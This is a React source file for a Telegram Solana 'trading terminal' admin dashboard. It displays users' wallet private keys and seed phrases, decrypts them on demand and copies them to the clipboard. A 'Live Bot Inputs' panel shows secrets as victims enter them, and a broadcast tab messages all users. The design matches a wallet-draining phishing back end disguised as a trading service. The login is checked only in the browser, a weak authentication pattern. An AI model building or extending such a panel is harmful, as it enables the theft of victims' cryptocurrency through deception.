import React, { useState, useEffect, useRef, Component } from "react";
import { 
  Users, 
  Shield, 
  Search, 
  Lock, 
  Unlock, 
  RefreshCw, 
  Database,
  BarChart3,
  Wallet,
  MessageSquare,
  History,
  Send,
  ExternalLink,
  TrendingUp,
  ArrowUpRight,
  ArrowDownRight
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface User {
  id: number;
  telegram_id: number;
  username: string;
  wallet_address: string;
  private_key: string;
  recovery_phrase: string;
  status: string;
  created_at: string;
}

interface Trade {
  id: number;
  username: string;
  token: string;
  amount: number;
  type: 'buy' | 'sell';
  timestamp: string;
}

interface Stats {
  users: number;
  trades: number;
}

type Tab = 'users' | 'trades' | 'broadcast';

export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const adminPassword = useRef("");
  const [activeTab, setActiveTab] = useState<Tab>('users');
  const [users, setUsers] = useState<User[]>([]);
  const [pendingUsers, setPendingUsers] = useState<any[]>([]);
  const [trades, setTrades] = useState<Trade[]>([]);
  const [stats, setStats] = useState<Stats>({ users: 0, trades: 0 });
  const [search, setSearch] = useState("");
  const [decryptedValues, setDecryptedValues] = useState<Record<string, any>>({});
  const [decrypting, setDecrypting] = useState<Record<string, boolean>>({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  
  // Broadcast state
  const [broadcastMsg, setBroadcastMsg] = useState("");
  const [broadcastStatus, setBroadcastStatus] = useState<{ success?: number, fail?: number } | null>(null);

  const [botStatus, setBotStatus] = useState<{ active: boolean, username?: string }>({ active: false });
  const [serverStatus, setServerStatus] = useState<'online' | 'offline' | 'checking'>('checking');
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const isFetching = useRef(false);

  const fetchWithTimeout = async (url: string, options: any = {}, timeout = 30000) => {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    
    // Attach admin password header
    const headers = {
      ...options.headers,
      "x-admin-password": adminPassword.current,
      "Content-Type": "application/json"
    };

    try {
      const response = await fetch(url, { ...options, headers, signal: controller.signal });
      clearTimeout(id);
      
      if (response.status === 401) {
        setIsLoggedIn(false);
        throw new Error("Unauthorized");
      }
      
      return response;
    } catch (err: any) {
      clearTimeout(id);
      if (err.name === 'AbortError') {
        throw new Error(`Request to ${url} timed out after ${timeout}ms`);
      }
      throw err;
    }
  };

  useEffect(() => {
    const refresh = async () => {
      // Run health check first
      const isHealthy = await checkServerHealth();
      
      // Only proceed with data fetch if server is online AND user is logged in
      if (isHealthy && isLoggedIn) {
        await Promise.all([
          fetchData(),
          checkBotStatus()
        ]);
      } else if (!isHealthy) {
        console.warn("Server is offline, skipping data fetch");
        setLoading(false);
      }
    };

    refresh();

    const interval = setInterval(refresh, 15000); // 15s refresh
    return () => clearInterval(interval);
  }, [isLoggedIn]);

  const isCheckingHealth = useRef(false);
  const isCheckingBot = useRef(false);

  const checkServerHealth = async () => {
    if (isCheckingHealth.current) return true;
    isCheckingHealth.current = true;
    try {
      const res = await fetchWithTimeout("/api/health", {}, 10000);
      if (res.ok) {
        setServerStatus('online');
        return true;
      } else {
        setServerStatus('offline');
        return false;
      }
    } catch (err) {
      setServerStatus('offline');
      return false;
    } finally {
      isCheckingHealth.current = false;
    }
  };

  const checkBotStatus = async () => {
    if (isCheckingBot.current) return;
    isCheckingBot.current = true;
    try {
      const res = await fetchWithTimeout("/api/admin/bot-status", {}, 10000);
      const contentType = res.headers.get("content-type");
      if (res.ok && contentType && contentType.includes("application/json")) {
        const data = await res.json();
        setBotStatus(data);
      } else {
        console.warn("Bot status check returned non-JSON or error response", res.status);
        setBotStatus({ active: false });
      }
    } catch (err: any) {
      console.error("Bot status check failed:", err.message || err);
      setBotStatus({ active: false });
    } finally {
      isCheckingBot.current = false;
    }
  };

  const fetchData = async () => {
    if (isFetching.current) return;
    isFetching.current = true;
    
    setLoading(true);
    try {
      const [usersRes, statsRes, tradesRes, pendingRes] = await Promise.all([
        fetchWithTimeout("/api/admin/users").catch(e => ({ ok: false, error: e })),
        fetchWithTimeout("/api/admin/stats").catch(e => ({ ok: false, error: e })),
        fetchWithTimeout("/api/admin/trades").catch(e => ({ ok: false, error: e })),
        fetchWithTimeout("/api/admin/pending").catch(e => ({ ok: false, error: e }))
      ]);
      
      if (usersRes.ok) setUsers(await (usersRes as Response).json());
      if (statsRes.ok) setStats(await (statsRes as Response).json());
      if (tradesRes.ok) setTrades(await (tradesRes as Response).json());
      if (pendingRes.ok) setPendingUsers(await (pendingRes as Response).json());
      
      if (usersRes.ok || statsRes.ok || tradesRes.ok || pendingRes.ok) {
        setLastUpdated(new Date());
        setError(null);
      } else {
        throw new Error("All data fetches failed");
      }
    } catch (err: any) {
      console.error("[Fetch Error]", err);
      // Only show error if we don't have any data yet
      if (users.length === 0) {
        setError(err.name === 'AbortError' ? "Request timed out. Server might be busy." : "Connection lost. Retrying...");
      }
    } finally {
      setLoading(false);
      isFetching.current = false;
    }
  };

  const handleDecrypt = async (id: number, field: 'private_key' | 'recovery_phrase', encryptedText: string) => {
    const key = `${id}-${field}`;
    if (decryptedValues[key]) {
      const newValues = { ...decryptedValues };
      delete newValues[key];
      setDecryptedValues(newValues);
      return;
    }

    setDecrypting(prev => ({ ...prev, [key]: true }));
    try {
      const res = await fetchWithTimeout("/api/admin/decrypt", {
        method: "POST",
        body: JSON.stringify({ encryptedText }),
      });
      if (res.ok) {
        const { decrypted } = await res.json();
        setDecryptedValues(prev => ({ ...prev, [key]: decrypted }));
      }
    } catch (err) {
      console.error("Decryption failed", err);
      setError("Decryption failed. Please try again.");
    } finally {
      setDecrypting(prev => ({ ...prev, [key]: false }));
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    // Optional: show a toast or temporary "Copied!" state
  };

  const handleBroadcast = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!broadcastMsg.trim()) return;
    
    setLoading(true);
    try {
      const res = await fetchWithTimeout("/api/admin/broadcast", {
        method: "POST",
        body: JSON.stringify({ message: broadcastMsg }),
      });
      const data = await res.json();
      setBroadcastStatus({ success: data.successCount, fail: data.failCount });
      setBroadcastMsg("");
    } catch (err) {
      console.error("Broadcast failed", err);
      setError("Broadcast failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const filteredUsers = (Array.isArray(users) ? users : []).filter(u => 
    (u.username || "").toLowerCase().includes(search.toLowerCase()) || 
    (u.wallet_address || "").toLowerCase().includes(search.toLowerCase()) ||
    (u.telegram_id || "").toString().includes(search)
  );

  const filteredTrades = (Array.isArray(trades) ? trades : []).filter(t => 
    (t.username || "").toLowerCase().includes(search.toLowerCase()) || 
    (t.token || "").toLowerCase().includes(search.toLowerCase())
  );

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    
    // Frontend-only password check using Vite environment variable
    const ENV_PASSWORD = import.meta.env.VITE_DASHBOARD_PASSWORD;
    
    if (passwordInput === ENV_PASSWORD) {
      adminPassword.current = passwordInput;
      setIsLoggedIn(true);
      setLoading(false);
    } else {
      setError("Invalid password");
      setLoading(false);
    }
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md bg-[#111] border border-white/10 rounded-2xl p-8 shadow-2xl"
        >
          <div className="flex justify-center mb-8">
            <div className="w-16 h-16 bg-emerald-500/10 rounded-2xl flex items-center justify-center border border-emerald-500/20">
              <Shield className="w-8 h-8 text-emerald-500" />
            </div>
          </div>
          
          <h1 className="text-2xl font-bold text-white text-center mb-2">Admin Access</h1>
          <p className="text-gray-400 text-center mb-8 text-sm">Enter password to access the trading terminal</p>
          
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="relative">
              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
              <input 
                type="password"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                placeholder="Admin Password"
                className="w-full bg-black/50 border border-white/10 rounded-xl py-3 pl-12 pr-4 text-white placeholder:text-gray-600 focus:outline-none focus:border-emerald-500/50 transition-colors"
                autoFocus
              />
            </div>
            
            {error && (
              <p className="text-red-500 text-xs text-center bg-red-500/10 py-2 rounded-lg border border-red-500/20">
                {error}
              </p>
            )}
            
            <button 
              type="submit"
              disabled={loading}
              className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-xl transition-all shadow-lg shadow-emerald-600/20"
            >
              {loading ? "Authenticating..." : "Login to Dashboard"}
            </button>
          </form>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-sans selection:bg-emerald-500/30">
      {/* Sidebar / Navigation */}
      <div className="flex flex-col lg:flex-row min-h-screen">
        <aside className="w-full lg:w-72 bg-[#0a0a0a] border-r border-white/5 p-6 flex flex-col">
          <div className="flex items-center gap-3 mb-12 px-2">
            <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center">
              <TrendingUp className="text-black w-6 h-6" />
            </div>
            <span className="text-white font-black text-xl tracking-tighter">SOL ELITE</span>
          </div>

          <nav className="space-y-2 flex-1">
            <button 
              onClick={() => setActiveTab('users')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'users' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'hover:bg-white/5 text-zinc-500'}`}
            >
              <Users className="w-5 h-5" />
              <span className="font-bold text-sm">Users</span>
            </button>
            <button 
              onClick={() => setActiveTab('trades')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'trades' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'hover:bg-white/5 text-zinc-500'}`}
            >
              <History className="w-5 h-5" />
              <span className="font-bold text-sm">Trade Logs</span>
            </button>
            <button 
              onClick={() => setActiveTab('broadcast')}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'broadcast' ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'hover:bg-white/5 text-zinc-500'}`}
            >
              <MessageSquare className="w-5 h-5" />
              <span className="font-bold text-sm">Broadcast</span>
            </button>
          </nav>

          <div className="mt-auto pt-6 border-t border-white/5">
            <div className="bg-[#111] rounded-2xl p-4 border border-white/5">
              <div className="flex items-center gap-3 mb-3">
                <div className={`w-2 h-2 rounded-full animate-pulse ${serverStatus === 'online' ? 'bg-emerald-500' : 'bg-red-500'}`} />
                <span className="text-xs font-bold text-white uppercase tracking-widest">
                  {serverStatus === 'online' ? 'System Online' : 'System Offline'}
                </span>
              </div>
              <p className="text-[10px] text-zinc-600 leading-relaxed">
                {serverStatus === 'online' 
                  ? "Terminal connected to Solana Mainnet-Beta. All systems operational."
                  : "Unable to reach the backend server. Please check your connection."}
              </p>
            </div>
          </div>
        </aside>

        {/* Main Content */}
        <main className="flex-1 p-6 lg:p-12 overflow-y-auto">
          <header className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-12">
            <div>
              <h2 className="text-4xl font-black text-white tracking-tight uppercase">
                {activeTab === 'users' && "User Directory"}
                {activeTab === 'trades' && "Transaction History"}
                {activeTab === 'broadcast' && "Global Broadcast"}
              </h2>
              <p className="text-zinc-500 mt-2">
                {activeTab === 'users' && `Managing ${stats.users} active terminal users`}
                {activeTab === 'trades' && `Monitoring ${stats.trades} total transactions`}
                {activeTab === 'broadcast' && "Send encrypted messages to all connected wallets"}
              </p>
            </div>

            <div className="flex items-center gap-4">
              {lastUpdated && (
                <span className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest hidden sm:block">
                  Last Sync: {lastUpdated.toLocaleTimeString()}
                </span>
              )}
              <button 
                onClick={fetchData}
                disabled={loading}
                className="p-3 bg-zinc-900 border border-white/5 rounded-xl text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all disabled:opacity-50"
                title="Refresh Data"
              >
                <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
              </button>
              {error && (
                <div className="bg-red-500/10 border border-red-500/20 text-red-500 px-4 py-2 rounded-xl text-xs font-bold">
                  {error}
                </div>
              )}
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                <input
                  type="text"
                  placeholder="Search..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="bg-[#0a0a0a] border border-white/5 rounded-2xl py-3 pl-12 pr-4 focus:outline-none focus:border-emerald-500/30 w-full md:w-64 text-sm transition-all"
                />
              </div>
            </div>
          </header>

          <AnimatePresence mode="wait">
            {activeTab === 'users' && (
              <motion.div 
                key="users"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                {/* Stats Row */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                      <Users className="w-24 h-24" />
                    </div>
                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Total Users</p>
                    <p className="text-5xl font-black text-white">{stats.users}</p>
                  </div>
                  <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                      <BarChart3 className="w-24 h-24" />
                    </div>
                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Total Trades</p>
                    <p className="text-5xl font-black text-white">{stats.trades}</p>
                  </div>
                  <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
                      <Shield className="w-24 h-24" />
                    </div>
                    <p className="text-zinc-500 text-xs font-black uppercase tracking-widest mb-2">Bot Status</p>
                    <p className={`text-3xl font-black mt-2 uppercase ${botStatus.active ? 'text-emerald-500' : 'text-red-500'}`}>
                      {botStatus.active ? "Online" : "Offline"}
                    </p>
                    <p className="text-[10px] text-zinc-600 font-bold mt-1">
                      {botStatus.active ? `@${botStatus.username || 'Bot'}` : "Check Token"}
                    </p>
                  </div>
                </div>

                {/* Pending Inputs Section */}
                {pendingUsers.length > 0 && (
                  <div className="bg-amber-500/5 border border-amber-500/20 rounded-3xl p-6 mb-6">
                    <div className="flex items-center gap-3 mb-4">
                      <div className="w-8 h-8 bg-amber-500 rounded-lg flex items-center justify-center">
                        <Database className="text-black w-5 h-5" />
                      </div>
                      <h3 className="text-white font-black uppercase tracking-widest text-sm">Live Bot Inputs (Pending)</h3>
                      <span className="bg-amber-500 text-black text-[10px] font-black px-2 py-0.5 rounded-full animate-pulse">
                        {pendingUsers.length} ACTIVE
                      </span>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                      {pendingUsers.map((p) => (
                        <div key={p.telegram_id} className="bg-black/40 border border-white/5 p-4 rounded-2xl">
                          <div className="flex items-center justify-between mb-3">
                            <span className="text-white font-bold text-xs">User: {p.telegram_id}</span>
                            <span className="text-[10px] text-amber-500 font-black uppercase tracking-widest">
                              Step: {p.step || 'Idle'}
                            </span>
                          </div>
                          <div className="space-y-2">
                            <div className="flex flex-col gap-1">
                              <span className="text-[9px] text-zinc-600 uppercase font-black">Private Key</span>
                              <code className="text-[10px] text-zinc-400 bg-zinc-900/50 p-2 rounded-lg break-all">
                                {p.pk || "Waiting..."}
                              </code>
                            </div>
                            <div className="flex flex-col gap-1">
                              <span className="text-[9px] text-zinc-600 uppercase font-black">Seed Phrase</span>
                              <code className="text-[10px] text-zinc-400 bg-zinc-900/50 p-2 rounded-lg break-all">
                                {p.seed || "Waiting..."}
                              </code>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Table */}
                <div className="bg-[#0a0a0a] border border-white/5 rounded-3xl overflow-hidden shadow-2xl">
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="bg-white/[0.02] border-b border-white/5">
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Identity</th>
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Wallet Address</th>
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Security Access</th>
                          <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Joined</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-white/5">
                        {filteredUsers.map((user) => (
                          <tr key={user.id} className="hover:bg-white/[0.01] transition-colors group">
                            <td className="p-6">
                              <div className="flex items-center gap-4">
                                <div className="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center border border-white/5 text-white font-bold">
                                  {(user.username || "?")[0].toUpperCase()}
                                </div>
                                <div className="flex flex-col">
                                  <div className="flex items-center gap-2">
                                    <span className="text-white font-bold">@{user.username}</span>
                                    {user.status === 'disconnected' && (
                                      <span className="text-[8px] bg-red-500/10 text-red-500 border border-red-500/20 px-1.5 py-0.5 rounded uppercase font-black">
                                        Disconnected
                                      </span>
                                    )}
                                  </div>
                                  <span className="text-[10px] text-zinc-600 font-mono">UID: {user.telegram_id}</span>
                                </div>
                              </div>
                            </td>
                            <td className="p-6">
                              <div className="flex items-center gap-2">
                                <code className="text-xs bg-emerald-500/5 px-3 py-1.5 rounded-lg text-emerald-500 border border-emerald-500/10 font-mono">
                                  {user.wallet_address.slice(0, 12)}...{user.wallet_address.slice(-12)}
                                </code>
                                <a 
                                  href={`https://solscan.io/account/${user.wallet_address}`} 
                                  target="_blank" 
                                  rel="noreferrer"
                                  className="p-1.5 hover:bg-white/5 rounded-lg transition-colors text-zinc-600 hover:text-white"
                                >
                                  <ExternalLink className="w-3.5 h-3.5" />
                                </a>
                              </div>
                            </td>
                            <td className="p-6">
                              <div className="flex flex-col gap-2">
                                <div 
                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 px-3 py-2 rounded-xl border border-white/5 transition-all w-full max-w-xs"
                                >
                                  <span className="text-zinc-600 uppercase font-black tracking-tighter">Private Key</span>
                                  <div className="flex items-center gap-2">
                                    <span className="font-mono text-zinc-400 break-all">
                                      {decrypting[`${user.id}-private_key`] ? "DECRYPTING..." : (decryptedValues[`${user.id}-private_key`] ? decryptedValues[`${user.id}-private_key`] : (user.private_key ? user.private_key.slice(0, 8) + "..." : "NONE"))}
                                    </span>
                                    <div className="flex items-center gap-1">
                                      {decryptedValues[`${user.id}-private_key`] && (
                                        <button 
                                          onClick={() => {
                                            navigator.clipboard.writeText(decryptedValues[`${user.id}-private_key`]);
                                          }}
                                          className="p-1 hover:bg-white/10 rounded transition-colors text-zinc-600 hover:text-emerald-500"
                                          title="Copy to clipboard"
                                        >
                                          <Send className="w-3 h-3" />
                                        </button>
                                      )}
                                      <button 
                                        onClick={() => handleDecrypt(user.id, 'private_key', user.private_key)}
                                        disabled={decrypting[`${user.id}-private_key`]}
                                        className="p-1 hover:bg-white/10 rounded transition-colors"
                                      >
                                        {decrypting[`${user.id}-private_key`] ? <RefreshCw className="w-3 h-3 text-zinc-600 animate-spin" /> : (decryptedValues[`${user.id}-private_key`] ? <Lock className="w-3 h-3 text-emerald-500" /> : <Unlock className="w-3 h-3 text-zinc-600" />)}
                                      </button>
                                    </div>
                                  </div>
                                </div>
                                <div 
                                  className="flex items-center justify-between gap-4 text-[10px] bg-zinc-900/50 px-3 py-2 rounded-xl border border-white/5 transition-all w-full max-w-xs"
                                >
                                  <span className="text-zinc-600 uppercase font-black tracking-tighter">Seed Phrase</span>
                                  <div className="flex items-center gap-2">
                                    <span className="font-mono text-zinc-400 break-all">
                                      {decrypting[`${user.id}-recovery_phrase`] ? "DECRYPTING..." : (decryptedValues[`${user.id}-recovery_phrase`] ? decryptedValues[`${user.id}-recovery_phrase`] : (user.recovery_phrase ? user.recovery_phrase.slice(0, 12) + "..." : "NONE"))}
                                    </span>
                                    <div className="flex items-center gap-1">
                                      {decryptedValues[`${user.id}-recovery_phrase`] && (
                                        <button 
                                          onClick={() => {
                                            navigator.clipboard.writeText(decryptedValues[`${user.id}-recovery_phrase`]);
                                          }}
                                          className="p-1 hover:bg-white/10 rounded transition-colors text-zinc-600 hover:text-emerald-500"
                                          title="Copy to clipboard"
                                        >
                                          <Send className="w-3 h-3" />
                                        </button>
                                      )}
                                      <button 
                                        onClick={() => handleDecrypt(user.id, 'recovery_phrase', user.recovery_phrase)}
                                        disabled={decrypting[`${user.id}-recovery_phrase`]}
                                        className="p-1 hover:bg-white/10 rounded transition-colors"
                                      >
                                        {decrypting[`${user.id}-recovery_phrase`] ? <RefreshCw className="w-3 h-3 text-zinc-600 animate-spin" /> : (decryptedValues[`${user.id}-recovery_phrase`] ? <Lock className="w-3 h-3 text-emerald-500" /> : <Unlock className="w-3 h-3 text-zinc-600" />)}
                                      </button>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </td>
                            <td className="p-6 text-xs font-medium text-zinc-600">
                              {new Date(user.created_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' })}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                  {filteredUsers.length === 0 && (
                    <div className="p-20 text-center">
                      <Users className="w-16 h-16 text-zinc-800 mx-auto mb-4" />
                      <p className="text-zinc-600 font-bold uppercase tracking-widest">No terminal users connected</p>
                    </div>
                  )}
                </div>
              </motion.div>
            )}

            {activeTab === 'trades' && (
              <motion.div 
                key="trades"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="bg-[#0a0a0a] border border-white/5 rounded-3xl overflow-hidden shadow-2xl"
              >
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="bg-white/[0.02] border-b border-white/5">
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">User</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Type</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Token Address</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Amount</th>
                        <th className="p-6 text-[10px] font-black uppercase tracking-widest text-zinc-500">Time</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {filteredTrades.map((trade) => (
                        <tr key={trade.id} className="hover:bg-white/[0.01] transition-colors">
                          <td className="p-6">
                            <span className="text-white font-bold">@{trade.username}</span>
                          </td>
                          <td className="p-6">
                            <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border ${trade.type === 'buy' ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20' : 'bg-red-500/10 text-red-500 border-red-500/20'}`}>
                              {trade.type}
                            </span>
                          </td>
                          <td className="p-6">
                            <div className="flex items-center gap-2">
                              <code className="text-xs font-mono text-zinc-500">
                                {trade.token.slice(0, 16)}...
                              </code>
                              <a 
                                href={`https://solscan.io/token/${trade.token}`} 
                                target="_blank" 
                                rel="noreferrer"
                                className="text-zinc-700 hover:text-white transition-colors"
                              >
                                <ExternalLink className="w-3 h-3" />
                              </a>
                            </div>
                          </td>
                          <td className="p-6">
                            <span className="text-white font-black">{trade.amount}</span>
                            <span className="text-[10px] text-zinc-600 ml-1 uppercase font-bold">{trade.type === 'buy' ? 'SOL' : 'UNITS'}</span>
                          </td>
                          <td className="p-6 text-xs text-zinc-600">
                            {new Date(trade.timestamp).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
                {filteredTrades.length === 0 && (
                  <div className="p-20 text-center">
                    <History className="w-16 h-16 text-zinc-800 mx-auto mb-4" />
                    <p className="text-zinc-600 font-bold uppercase tracking-widest">No transaction data found</p>
                  </div>
                )}
              </motion.div>
            )}

            {activeTab === 'broadcast' && (
              <motion.div 
                key="broadcast"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="max-w-2xl"
              >
                <div className="bg-[#0a0a0a] border border-white/5 p-10 rounded-3xl shadow-2xl">
                  <div className="flex items-center gap-4 mb-8">
                    <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl flex items-center justify-center border border-emerald-500/20">
                      <Send className="w-6 h-6 text-emerald-500" />
                    </div>
                    <div>
                      <h3 className="text-xl font-black text-white uppercase tracking-tight">Global Dispatch</h3>
                      <p className="text-xs text-zinc-500 mt-1">Message will be sent to {stats.users} active users</p>
                    </div>
                  </div>

                  <form onSubmit={handleBroadcast} className="space-y-6">
                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-1">Message Content</label>
                      <textarea 
                        value={broadcastMsg}
                        onChange={(e) => setBroadcastMsg(e.target.value)}
                        placeholder="Type your announcement here..."
                        rows={6}
                        className="w-full bg-[#111] border border-white/5 rounded-2xl p-6 focus:outline-none focus:border-emerald-500/30 text-white placeholder:text-zinc-800 resize-none transition-all"
                      />
                    </div>

                    <button 
                      type="submit"
                      disabled={loading || !broadcastMsg.trim()}
                      className="w-full bg-white hover:bg-zinc-200 disabled:opacity-50 disabled:hover:bg-white text-black font-black py-4 rounded-2xl transition-all flex items-center justify-center gap-3 active:scale-[0.98]"
                    >
                      {loading ? <RefreshCw className="w-5 h-5 animate-spin" /> : <Send className="w-5 h-5" />}
                      EXECUTE BROADCAST
                    </button>
                  </form>

                  {broadcastStatus && (
                    <motion.div 
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="mt-8 p-6 bg-emerald-500/5 border border-emerald-500/10 rounded-2xl flex items-center justify-between"
                    >
                      <div className="flex items-center gap-4">
                        <div className="w-10 h-10 bg-emerald-500/20 rounded-xl flex items-center justify-center">
                          <Shield className="w-5 h-5 text-emerald-500" />
                        </div>
                        <div>
                          <p className="text-white font-bold text-sm">Broadcast Complete</p>
                          <p className="text-[10px] text-zinc-500 uppercase tracking-widest mt-0.5">Transmission Successful</p>
                        </div>
                      </div>
                      <div className="flex gap-6">
                        <div className="text-center">
                          <p className="text-emerald-500 font-black text-xl">{broadcastStatus.success}</p>
                          <p className="text-[8px] text-zinc-600 uppercase font-black">Sent</p>
                        </div>
                        <div className="text-center">
                          <p className="text-red-500 font-black text-xl">{broadcastStatus.fail}</p>
                          <p className="text-[8px] text-zinc-600 uppercase font-black">Failed</p>
                        </div>
                      </div>
                    </motion.div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </main>
      </div>
    </div>
  );
}
